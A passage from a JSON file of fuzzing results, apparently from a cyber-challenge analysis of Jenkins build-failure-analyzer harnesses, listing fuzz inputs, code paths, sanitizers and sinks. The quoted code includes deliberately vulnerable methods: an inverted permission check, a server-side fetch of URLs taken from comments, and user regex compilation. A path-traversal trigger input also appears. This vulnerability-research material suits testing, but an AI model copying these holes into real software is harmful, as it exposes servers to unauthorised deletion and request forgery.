            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n145       private RequestImpl createHttpRequest(ByteBuffer buffer) throws Throwable {\n146           HttpSession httpSession = Mockito.mock(HttpSession.class);\n147           HttpServletRequest httpRequest = Mockito.mock(HttpServletRequest.class);\n148           RequestImpl requestImpl = spy(new RequestImpl(replacer.stapler, httpRequest, Collections.emptyList(), null));\n149           when(httpRequest.getSession(anyBoolean())).thenReturn(httpSession);\n150           int numParams = (int) buffer.get();\n151           if (numParams > 0) {\n152               for (int i = 0; i < numParams; ++i) {\n153                   String name = readStringUntilNullByte(buffer);\n154                   String value = readStringUntilNullByte(buffer);\n155                   when(httpRequest.getParameter(name)).thenReturn(value);\n156               }\n157           }\n158           String form = readStringUntilNullByte(buffer);\n159           if (form.length() == 0) {\n160               form = \"{}\";\n161           }\n162           // NOTE: Below is to prevent hang from JSONObject.fromObject.\n163           // JSONObject.fromObject has infinite loop vulnerability when a specific value\n164           // is given.\n165           // int startIndex = form.indexOf(\"/*\", 0);\n166           // while (startIndex != -1) {\n167           // int endIndex = form.indexOf(\"*/\", startIndex+2);\n168           // int starIndex = form.indexOf(\"*\", startIndex+2);\n169           // if ((starIndex < endIndex) || (endIndex == -1)) {\n170           // form = \"{}\";\n171           // break;\n172           // }\n173           // if (endIndex == -1) {\n174           // break;\n175           // }\n176           // startIndex = form.indexOf(\"/*\", endIndex+2);\n177           // }\n178           JSONObject formObject = JSONObject.fromObject(form);\n179           doReturn(formObject).when(requestImpl).getSubmittedForm();\n180           return requestImpl;\n181       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FailureCause.java:\n193       public FormValidation validate(String newName,\n194                                      String newDescription,\n195                                      List<Indication> newIndications) {\n196           FormValidation nameVal = getDescriptor().doCheckName(newName, id);\n197           if (nameVal.kind != FormValidation.Kind.OK) {\n198               return nameVal;\n199           }\n200           FormValidation descriptionVal = getDescriptor().doCheckDescription(newDescription);\n201           if (descriptionVal.kind != FormValidation.Kind.OK) {\n202               return descriptionVal;\n203           }\n204           if (newIndications == null || newIndications.isEmpty()) {\n205               return FormValidation.error(\"Need at least one indication for \" + newName);\n206           }\n207           for (Indication indication : newIndications) {\n208               FormValidation validation = indication.validate();\n209               if (validation.kind != FormValidation.Kind.OK) {\n210                   return validation;\n211               }\n212           }\n213           return FormValidation.ok();\n214       }\n248       public synchronized void doConfigSubmit(StaplerRequest request, StaplerResponse response)\n249               throws Exception {\n250           logger.entering(getClass().getName(), \"doConfigSubmit\");\n251           if (!Jenkins.get().hasPermission(PluginImpl.UPDATE_PERMISSION)) {\n252               throw new Failure(\"Not authorized\");\n253           }\n254           JSONObject form = request.getSubmittedForm();\n255           String newId = form.getString(\"id\");\n256           newId = Util.fixEmpty(newId);\n257           String oldId = Util.fixEmpty(id);\n258           //Just some paranoid checks\n259           if (newId != null) {\n260               if (oldId != null && !newId.equals(oldId)) {\n261                   throw new Failure(\"Attempt at changing the wrong cause! Expected [\" + id + \"] but got [\" + newId + \"]\");\n262               } else if (oldId == null) {\n263                   throw new Failure(\"Attempt at setting id of new cause!\");\n264               }\n265           } else if (oldId != null) {\n266               throw new Failure(\"Clone attempt of cause [\" + id + \"]\");\n267           }\n268           String newName = form.getString(\"name\");\n269           String newDescription = form.getString(\"description\");\n270           String newComment = form.getString(\"comment\");\n271           String jsonCategories = form.optString(\"categories\");\n272           if (Util.fixEmpty(jsonCategories) != null) {\n273               this.categories = Arrays.asList(Util.tokenize(jsonCategories));\n274           } else {\n275               this.categories = null;\n276           }\n277   \n278           Object jsonIndications = form.opt(\"indications\");\n279           if (jsonIndications == null) {\n280               throw new Failure(\"You need to provide at least one indication!\");\n281           }\n282           List<Indication> newIndications = request.bindJSONToList(Indication.class, jsonIndications);\n283           FormValidation validation = validate(newName, newDescription, newIndications);\n284           if (validation.kind != FormValidation.Kind.OK) {\n285               throw validation;\n286           }\n287           this.name = newName;\n288           this.description = newDescription;\n289           this.comment = newComment;\n290           this.indications = newIndications;\n291   \n292           String user = null;\n293           User current = User.current();\n294           if (current != null) {\n295               user = current.getId();\n296           }\n297   \n298           this.modifications.add(0, new FailureCauseModification(user, new Date()));\n299   \n300           if (newId == null) {\n301               PluginImpl.getInstance().getKnowledgeBase().addCause(this);\n302           } else {\n303               PluginImpl.getInstance().getKnowledgeBase().saveCause(this);\n304           }\n305   \n306           response.sendRedirect2(\"../\");\n307       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/Indication.java:\n 87       public FormValidation validate() {\n 88           return IndicationDescriptor.checkPattern(getUserProvidedExpression());\n 89       }\n125           public static FormValidation checkPattern(@QueryParameter String value) {\n126               if (value == null || value.isEmpty()) {\n127                   return FormValidation.error(\"Please provide a pattern!\");\n128               }\n129               try {\n130                   Pattern.compile(value);\n131                   return FormValidation.ok();\n132               } catch (PatternSyntaxException e) {\n133                   return FormValidation.error(\"Bad syntax! \" + e.getMessage());\n134               } catch (Exception e) {\n135                   return FormValidation.warning(\"Unpredicted error. \" + e.getMessage());\n136               }\n137           }\n",
            "cost": 0.49311999999999995,
            "harness_id": "id_4",
            "sanitizer": "Regular Expression Injection",
            "sink": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/Indication.java:130:33",
            "status": "corpus",
            "valid_path": "YES",
            "id": 40
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n139       public void save() throws IOException {\n140           Path path = Paths.get(Jenkins.get().getRootDir().toString(), PluginImpl.getStaticResourcesBase(), PATH);\n141           if (!Files.exists(path)) {\n142               Files.createDirectories(path);\n143           }\n144           for (Map.Entry<String, FailureCause> entry : causes.entrySet()) {\n145               String id = entry.getKey();\n146               FailureCause cause = entry.getValue();\n147               Path filePath = path.resolve(id);\n148               try (FileOutputStream fos = new FileOutputStream(filePath.toFile());\n149                       ObjectOutputStream oos = new ObjectOutputStream(fos)) {\n150                   oos.writeObject(cause);\n151               }\n152           }\n153       }\n341           @POST\n342           public FormValidation doSave(StaplerRequest request) {\n343               Jenkins jenkins = Jenkins.get();\n344               if (!jenkins.hasPermission(PluginImpl.UPDATE_PERMISSION)) {\n345                   return FormValidation.error(\"Not Authorized\");\n346               }\n347   \n348               LocalFileKnowledgeBase knowledgeBase = (LocalFileKnowledgeBase) PluginImpl.getInstance().getKnowledgeBase();\n349               try {\n350                   knowledgeBase.save();\n351               } catch (IOException e) {\n352                   return FormValidation.error(e.getMessage());\n353               }\n354               return FormValidation.ok();\n355           }\n",
            "cost": 0.045685,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:148:62",
            "status": "corpus",
            "valid_path": "NO",
            "id": 41
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n192       @Override\n193       public FailureCause removeCause(String id) throws Exception {\n194           FailureCause remove = causes.remove(id);\n195           getPlugin().save();\n196           return remove;\n197       }\n\nsrc/jenkins/core/src/main/java/hudson/model/Descriptor.java:\n 908       @Override\n 909       public synchronized void save() {\n 910           if (BulkChange.contains(this))   return;\n 911           try {\n 912               getConfigFile().write(this);\n 913               SaveableListener.fireOnChange(this, getConfigFile());\n 914           } catch (IOException e) {\n 915               LOGGER.log(Level.WARNING, \"Failed to save \" + getConfigFile(), e);\n 916           }\n 917       }\n\nsrc/jenkins/core/src/main/java/hudson/XmlFile.java:\n203       public void write(Object o) throws IOException {\n204           mkdirs();\n205           AtomicFileWriter w = force\n206                   ? new AtomicFileWriter(file)\n207                   : new AtomicFileWriter(file.toPath(), StandardCharsets.UTF_8, false, false);\n208           try {\n209               w.write(\"<?xml version='1.1' encoding='UTF-8'?>\\n\");\n210               beingWritten.put(o, null);\n211               writing.set(file);\n212               try {\n213                   xs.toXML(o, w);\n214               } finally {\n215                   beingWritten.remove(o);\n216                   writing.set(null);\n217               }\n218               w.commit();\n219           } catch (RuntimeException e) {\n220               throw new IOException(e);\n221           } finally {\n222               w.abort();\n223           }\n224       }\n\nsrc/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java:\n191       public void commit() throws IOException {\n192           close();\n193           try {\n194               // Try to make an atomic move.\n195               Files.move(tmpPath, destPath, StandardCopyOption.ATOMIC_MOVE);\n196           } catch (IOException moveFailed) {\n197               // If it falls here that can mean many things. Either that the atomic move is not supported,\n198               // or something wrong happened. Anyway, let's try to be over-diagnosing\n199               if (moveFailed instanceof AtomicMoveNotSupportedException) {\n200                   LOGGER.log(Level.WARNING, \"Atomic move not supported. falling back to non-atomic move.\", moveFailed);\n201               } else {\n202                   LOGGER.log(Level.WARNING, \"Unable to move atomically, falling back to non-atomic move.\", moveFailed);\n203               }\n204   \n205               if (destPath.toFile().exists()) {\n206                   LOGGER.log(Level.INFO, \"The target file {0} was already existing\", destPath);\n207               }\n208   \n209               try {\n210                   Files.move(tmpPath, destPath, StandardCopyOption.REPLACE_EXISTING);\n211               } catch (IOException replaceFailed) {\n212                   replaceFailed.addSuppressed(moveFailed);\n213                   LOGGER.log(Level.WARNING, \"Unable to move {0} to {1}. Attempting to delete {0} and abandoning.\",\n214                              new Path[]{tmpPath, destPath});\n215                   try {\n216                       Files.deleteIfExists(tmpPath);\n217                   } catch (IOException deleteFailed) {\n218                       replaceFailed.addSuppressed(deleteFailed);\n219                       LOGGER.log(Level.WARNING, \"Unable to delete {0}, good bye then!\", tmpPath);\n220                       throw replaceFailed;\n221                   }\n222   \n223                   throw replaceFailed;\n224               }\n225           }\n226       }\n",
            "cost": 0.061810000000000004,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java:195:33",
            "status": "corpus",
            "valid_path": "NO",
            "id": 42
        },
        {
            "blob": [
                "ARgBaWQAamF6emVyLXRyYXZlcnNhbAAA"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n145       private RequestImpl createHttpRequest(ByteBuffer buffer) throws Throwable {\n146           HttpSession httpSession = Mockito.mock(HttpSession.class);\n147           HttpServletRequest httpRequest = Mockito.mock(HttpServletRequest.class);\n148           RequestImpl requestImpl = spy(new RequestImpl(replacer.stapler, httpRequest, Collections.emptyList(), null));\n149           when(httpRequest.getSession(anyBoolean())).thenReturn(httpSession);\n150           int numParams = (int) buffer.get();\n151           if (numParams > 0) {\n152               for (int i = 0; i < numParams; ++i) {\n153                   String name = readStringUntilNullByte(buffer);\n154                   String value = readStringUntilNullByte(buffer);\n155                   when(httpRequest.getParameter(name)).thenReturn(value);\n156               }\n157           }\n158           String form = readStringUntilNullByte(buffer);\n159           if (form.length() == 0) {\n160               form = \"{}\";\n161           }\n162           // NOTE: Below is to prevent hang from JSONObject.fromObject.\n163           // JSONObject.fromObject has infinite loop vulnerability when a specific value\n164           // is given.\n165           // int startIndex = form.indexOf(\"/*\", 0);\n166           // while (startIndex != -1) {\n167           // int endIndex = form.indexOf(\"*/\", startIndex+2);\n168           // int starIndex = form.indexOf(\"*\", startIndex+2);\n169           // if ((starIndex < endIndex) || (endIndex == -1)) {\n170           // form = \"{}\";\n171           // break;\n172           // }\n173           // if (endIndex == -1) {\n174           // break;\n175           // }\n176           // startIndex = form.indexOf(\"/*\", endIndex+2);\n177           // }\n178           JSONObject formObject = JSONObject.fromObject(form);\n179           doReturn(formObject).when(requestImpl).getSubmittedForm();\n180           return requestImpl;\n181       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n192       @Override\n193       public FailureCause removeCause(String id) throws Exception {\n194           FailureCause remove = causes.remove(id);\n195           getPlugin().save();\n196           return remove;\n197       }\n\nsrc/jenkins/core/src/main/java/hudson/model/Descriptor.java:\n 908       @Override\n 909       public synchronized void save() {\n 910           if (BulkChange.contains(this))   return;\n 911           try {\n 912               getConfigFile().write(this);\n 913               SaveableListener.fireOnChange(this, getConfigFile());\n 914           } catch (IOException e) {\n 915               LOGGER.log(Level.WARNING, \"Failed to save \" + getConfigFile(), e);\n 916           }\n 917       }\n\nsrc/jenkins/core/src/main/java/hudson/XmlFile.java:\n203       public void write(Object o) throws IOException {\n204           mkdirs();\n205           AtomicFileWriter w = force\n206                   ? new AtomicFileWriter(file)\n207                   : new AtomicFileWriter(file.toPath(), StandardCharsets.UTF_8, false, false);\n208           try {\n209               w.write(\"<?xml version='1.1' encoding='UTF-8'?>\\n\");\n210               beingWritten.put(o, null);\n211               writing.set(file);\n212               try {\n213                   xs.toXML(o, w);\n214               } finally {\n215                   beingWritten.remove(o);\n216                   writing.set(null);\n217               }\n218               w.commit();\n219           } catch (RuntimeException e) {\n220               throw new IOException(e);\n221           } finally {\n222               w.abort();\n223           }\n224       }\n\nsrc/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java:\n191       public void commit() throws IOException {\n192           close();\n193           try {\n194               // Try to make an atomic move.\n195               Files.move(tmpPath, destPath, StandardCopyOption.ATOMIC_MOVE);\n196           } catch (IOException moveFailed) {\n197               // If it falls here that can mean many things. Either that the atomic move is not supported,\n198               // or something wrong happened. Anyway, let's try to be over-diagnosing\n199               if (moveFailed instanceof AtomicMoveNotSupportedException) {\n200                   LOGGER.log(Level.WARNING, \"Atomic move not supported. falling back to non-atomic move.\", moveFailed);\n201               } else {\n202                   LOGGER.log(Level.WARNING, \"Unable to move atomically, falling back to non-atomic move.\", moveFailed);\n203               }\n204   \n205               if (destPath.toFile().exists()) {\n206                   LOGGER.log(Level.INFO, \"The target file {0} was already existing\", destPath);\n207               }\n208   \n209               try {\n210                   Files.move(tmpPath, destPath, StandardCopyOption.REPLACE_EXISTING);\n211               } catch (IOException replaceFailed) {\n212                   replaceFailed.addSuppressed(moveFailed);\n213                   LOGGER.log(Level.WARNING, \"Unable to move {0} to {1}. Attempting to delete {0} and abandoning.\",\n214                              new Path[]{tmpPath, destPath});\n215                   try {\n216                       Files.deleteIfExists(tmpPath);\n217                   } catch (IOException deleteFailed) {\n218                       replaceFailed.addSuppressed(deleteFailed);\n219                       LOGGER.log(Level.WARNING, \"Unable to delete {0}, good bye then!\", tmpPath);\n220                       throw replaceFailed;\n221                   }\n222   \n223                   throw replaceFailed;\n224               }\n225           }\n226       }\n",
            "cost": 0.5159950000000001,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java:210:37",
            "status": "corpus",
            "valid_path": "YES",
            "id": 43
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FailureCause.java:\n248       public synchronized void doConfigSubmit(StaplerRequest request, StaplerResponse response)\n249               throws Exception {\n250           logger.entering(getClass().getName(), \"doConfigSubmit\");\n251           if (!Jenkins.get().hasPermission(PluginImpl.UPDATE_PERMISSION)) {\n252               throw new Failure(\"Not authorized\");\n253           }\n254           JSONObject form = request.getSubmittedForm();\n255           String newId = form.getString(\"id\");\n256           newId = Util.fixEmpty(newId);\n257           String oldId = Util.fixEmpty(id);\n258           //Just some paranoid checks\n259           if (newId != null) {\n260               if (oldId != null && !newId.equals(oldId)) {\n261                   throw new Failure(\"Attempt at changing the wrong cause! Expected [\" + id + \"] but got [\" + newId + \"]\");\n262               } else if (oldId == null) {\n263                   throw new Failure(\"Attempt at setting id of new cause!\");\n264               }\n265           } else if (oldId != null) {\n266               throw new Failure(\"Clone attempt of cause [\" + id + \"]\");\n267           }\n268           String newName = form.getString(\"name\");\n269           String newDescription = form.getString(\"description\");\n270           String newComment = form.getString(\"comment\");\n271           String jsonCategories = form.optString(\"categories\");\n272           if (Util.fixEmpty(jsonCategories) != null) {\n273               this.categories = Arrays.asList(Util.tokenize(jsonCategories));\n274           } else {\n275               this.categories = null;\n276           }\n277   \n278           Object jsonIndications = form.opt(\"indications\");\n279           if (jsonIndications == null) {\n280               throw new Failure(\"You need to provide at least one indication!\");\n281           }\n282           List<Indication> newIndications = request.bindJSONToList(Indication.class, jsonIndications);\n283           FormValidation validation = validate(newName, newDescription, newIndications);\n284           if (validation.kind != FormValidation.Kind.OK) {\n285               throw validation;\n286           }\n287           this.name = newName;\n288           this.description = newDescription;\n289           this.comment = newComment;\n290           this.indications = newIndications;\n291   \n292           String user = null;\n293           User current = User.current();\n294           if (current != null) {\n295               user = current.getId();\n296           }\n297   \n298           this.modifications.add(0, new FailureCauseModification(user, new Date()));\n299   \n300           if (newId == null) {\n301               PluginImpl.getInstance().getKnowledgeBase().addCause(this);\n302           } else {\n303               PluginImpl.getInstance().getKnowledgeBase().saveCause(this);\n304           }\n305   \n306           response.sendRedirect2(\"../\");\n307       }\n\nsrc/jenkins/core/src/main/java/hudson/model/User.java:\n 188       private User(String id, String fullName) {\n 189           this.id = id;\n 190           this.fullName = fullName;\n 191           load(id);\n 192       }\n 194       private void load(String userId) {\n 195           clearExistingProperties();\n 196           loadFromUserConfigFile(userId);\n 197           removeNullsThatFailedToLoad();\n 198           allocateDefaultPropertyInstancesAsNeeded();\n 199           setUserToProperties();\n 200       }\n 222       private void loadFromUserConfigFile(String userId) {\n 223           XmlFile config = getConfigFile();\n 224           try {\n 225               if (config != null && config.exists()) {\n 226                   config.unmarshal(this);\n 227                   this.id = userId;\n 228               }\n 229           } catch (IOException e) 